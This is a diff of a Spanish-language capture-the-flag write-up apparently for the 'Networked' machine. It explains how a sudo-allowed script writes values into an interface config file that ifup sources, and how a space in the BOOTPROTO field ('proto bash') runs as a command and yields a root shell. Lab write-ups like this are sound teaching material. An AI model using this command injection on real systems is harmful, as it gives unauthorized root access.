@@ -81,15 +81,19 @@ User guly may run the following commands on networked:
     (root) NOPASSWD: /usr/local/sbin/changename.sh
 ```
 
-El script lee valores y los pasa a `ifconfig`/`ifup` sin comillas; una línea con espacios se interpreta como asignación más comando.
+El script (`#!/bin/bash -p`) escribe `/etc/sysconfig/network-scripts/ifcfg-guly` con los valores que tecleas y después ejecuta `/sbin/ifup guly0`. `ifup` hace `source` de ese fichero, así que un valor con espacio deja de ser una asignación y pasa a ser un **comando**. La validación por línea (`^[a-zA-Z0-9_ /-]+$`) permite el espacio: ahí está el fallo.
 
 ```text
 sudo /usr/local/sbin/changename.sh
-NAME=eth0
-...
+interface NAME:          eth0
+interface PROXY_METHOD:  none
+interface BROWSER_ONLY:  no
+interface BOOTPROTO:     proto bash
 ```
 
-Con `PATH`/`IFACE` manipulados y una línea que ejecute `/bin/bash`, se obtiene root.
+```text
+[root@networked network-scripts]#
+```
 
 ## Evidencia
 
